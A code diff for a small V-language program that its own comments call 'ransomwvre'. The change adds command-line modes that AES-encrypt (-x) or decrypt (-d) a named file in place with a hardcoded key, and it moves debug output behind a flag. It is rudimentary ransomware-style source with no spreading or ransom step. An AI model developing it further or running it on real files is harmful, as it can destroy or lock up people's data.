@@ -1,14 +1,17 @@
 import os
 import crypto.aes
 import crypto.cipher
-// import os.cmdline
+import os.cmdline
 
 /*
 Features:
 - Will encrypt empty files
 - Potentially can increase the size of file if filesize isn't divisible by aes.block_size (16)
 - If original file has null byte for some reason, it will get deleted in decryption
-- Only works with files
+- Only works with files, no directories
+- Reads only first option and argument
+- Data loss is possible, must only encrypt or decrypt once.
+    - i.e can do ./ransomwvre -d test/enc.txt twice consecutive or data loss is eminent (same goes for encryption)
 */
 
 
@@ -32,7 +35,7 @@ fn enc(ciphr cipher.Block, file string) string {
         // appends null bytes until data is divisible by block_size
         fbyte << []byte{len: nullpad, init: '0'.byte()}
     }
-    println(fbyte.len)
+    // println(fbyte.len)
 
     mut encrypted := []byte{len: fbyte.len, init: 0}
     
@@ -75,7 +78,7 @@ fn dec(ciphr cipher.Block, file string) string {
 }
 
 // deftest : 
-fn deftest() {
+fn deftest(debug bool) {
 
     // Test Files
     file := 'test/file3.txt' // can change this to test functionality
@@ -87,13 +90,12 @@ fn deftest() {
         println(err)
         panic(err)
     }
-    println("$f")
+
 
     // create cipher from characters with len(bytes) == 32 for aes-256
     ciphr := cipher("🕵🏻🕵🏻🕵🏻🕵🏻")
     
     // Encryption 
-    println("-------------------------------------")
     encrypted := enc(ciphr, '$file')
     os.write_file('$out_file', encrypted) or {
         println(err)
@@ -104,10 +106,8 @@ fn deftest() {
         println(err.msg)
         panic(err)
     }
-    println("$g")
 
     // Decryption
-    println("=====================================")
     decrypted := dec(ciphr, out_file)
     os.write_file('$tin_file', decrypted) or {
         println(err)
@@ -118,16 +118,48 @@ fn deftest() {
         println(err)
         panic(err)
     }
-    println("$k")
+
+    if debug {
+        println("$f")
+        // Encryption
+        println("-------------------------------------")
+        println("$g")
+
+        // Decryption
+        println("=====================================")
+        println("$k")
+
+    }
 }
 
 
 // main : handles command line arguments + does the dipp
 fn main() {
 
-    // println(cmdline.only_non_options(os.args))
-    // println(cmdline.only_options(os.args))
+    files := cmdline.only_non_options(os.args)[1..]
+    options := cmdline.only_options(os.args)
 
-    deftest()
+    if files.len < 1 {
+        if options.len < 1 {
+            println('+++++++++++++++++++++++++++++++++++++++++')
+            println('               Test Case                 ')
+            println('+++++++++++++++++++++++++++++++++++++++++\n')
+            deftest(true)
+            println('+++++++++++++++++++++++++++++++++++++++++\n')
+        }
+        println("Be sure to enter both a file and option via command line arg")
+    } else {
+        
+        ciphr := cipher("🕵🏻🕵🏻🕵🏻🕵🏻")
 
+        if '-d' == options[0] {
+            decrypted := dec(ciphr, files[0])
+            os.write_file(files[0], decrypted)?
+        }
+
+        if '-x' == options[0] {
+            encrypted := enc(ciphr, files[0])
+            os.write_file(files[0], encrypted)?
+        }
+    }
 }
